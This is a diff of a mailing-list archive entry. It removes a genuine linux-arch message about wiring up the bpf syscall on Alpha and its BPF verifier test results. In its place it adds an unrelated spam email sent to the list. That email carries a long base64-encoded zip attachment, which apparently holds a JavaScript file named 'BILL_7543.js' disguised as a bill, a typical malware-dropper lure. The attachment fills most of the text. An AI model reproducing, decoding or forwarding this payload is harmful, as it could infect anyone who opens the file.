@@ -1,90 +1,139 @@
-From: Michael Cree <mcree-q3Ck4f9/EBK9koe0gwxAeg@public.gmane.org>
-Subject: bpf on Alpha [was Re: [PATCH 2/3] ARM: convert to generated system
- call tables]
-Date: Wed, 26 Oct 2016 22:12:50 +1300
-Message-ID: <20161026091250.djo6edsgjs7crsmg@tower>
-References: <E1bwa6s-0004ZY-4k@rmk-PC.armlinux.org.uk>
- <3851270.xZRcP9hae0@wuerfel>
- <20161025091210.rjfhvq4mqtuquei5@tower>
- <4146248.jXuviLlvH5@wuerfel>
- <20161026070430.e2tkbzza5lk4lgju@tower>
+From: <h.gerritsen12@chello.nl>
+Subject: 556740382 linux-arch
+Date: Wed, 26 Oct 2016 16:04:34 -0000
+Message-ID: <147749787475.1195.12054234988067752414@creolink.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-api-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-Content-Disposition: inline
-In-Reply-To: <20161026070430.e2tkbzza5lk4lgju@tower>
-Sender: linux-api-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Arnd Bergmann <arnd-r2nGTMty4D4@public.gmane.org>, Russell King - ARM Linux <linux-I+IVW8TIWO2tmTQ+vhA3Yw@public.gmane.org>, linux-arm-kernel-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org, linux-arch <linux-arch-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, linux-api <linux-api-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, linux-alpha-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-List-Id: linux-arch.vger.kernel.org
+Content-Type: application/zip; name="INFO_059898160624080_linux-arch.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-arch-owner@vger.kernel.org>
+Received: from host28-20.creolink.com ([41.223.28.20]:38082 "HELO creolink.com"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S932356AbcJZQEk (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Wed, 26 Oct 2016 12:04:40 -0400
+Content-Disposition: attachment
+Sender: linux-arch-owner@vger.kernel.org
+List-ID: <linux-arch.vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-On Wed, Oct 26, 2016 at 08:04:30PM +1300, Michael Cree wrote:
-> On Tue, Oct 25, 2016 at 12:28:16PM +0200, Arnd Bergmann wrote:
-> > On Tuesday, October 25, 2016 10:12:10 PM CEST Michael Cree wrote:
-> > > On Fri, Oct 21, 2016 at 03:06:45PM +0200, Arnd Bergmann wrote:
-> > > > I see your point, but I think there are serious issues with the current
-> > > > approach as well:
-> > > > 
-> > > > - a lot of the less common architectures just don't get updated
-> > > >   in time, out of 22 architectures that don't use asm-generic/unistd.h,
-> > > >   only 12 have pwritev2 in linux-next, and only three have pkey_mprotect
-> > > > 
-> > > > - some architectures that add all syscalls sometimes make a mistake
-> > > >   and forget one, e.g. alpha apparently never added __NR_bpf, but it
-> > > >   did add the later __NR_execveat.
-> > > 
-> > > __NR_bpf was not forgotten on Alpha.  It was not wired up because
-> > > extra architecture support is needed which has not been implemented.
-> > > 
-> > > But maybe we should just wire it up to sys_ni_syscall in the meantime
-> > > so a syscall number is reserved for it, and user space can call it to
-> > > get -ENOSYS returned.
-> > 
-> > Ah, I must have misinterpreted the code then. I assumed that the
-> > bpf syscall always works on all architectures, but that only the
-> > jit compiler for it required architecture specific code to make it
-> > more efficient.
-> 
-> Oh.  When someone posted wiring up of syscalls on Alpha some time
-> back I raised a query about seccomp then someone else (I can't be
-> bothered looking up the old emails, it doesn't really matter)
-> said bpf was in the same basket, so the patch was re-submitted with
-> neither of those syscalls.
-> 
-> > sys_seccomp is another one that falls into a similar category, but
-> > it already depends on HAVE_ARCH_SECCOMP_FILTER, and most other
-> > architectures have assigned a syscall number but not set this symbol.
-> > This one will actually allow you to set strict seccomp mode even
-> > without the Kconfig symbol, just not allow to set a filter.
-> 
-> We have got way behind on syscalls on Alpha and I was just in the
-> process of wiring them up and testing them, so I will include both
-> seccomp and bpf in that.
-
-Having just wired up bpf on an Alpha and run samples/bpf/test_verifier
-I get:
-
-#0 add+sub+mul OK
-#1 unreachable OK
-#2 unreachable2 OK
-#3 out of range jump OK
-
-[snip many passing tests]
-
-#69 unpriv: check that printk is disallowed FAIL
-failed to load prog 'Invalid argument'
-0: (7a) *(u64 *)(r10 -8) = 0
-1: (bf) r1 = r10
-2: (07) r1 += -8
-3: (b7) r2 = 8
-4: (bf) r3 = r1
-5: (85) call 6
-unknown func 6
-
-[snip many more passing tests]
-
-Summary: 101 PASSED, 1 FAILED
-
-Should I be concerned about the failing #69 test?
-
-Cheers
-Michael.
+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
+AAAA
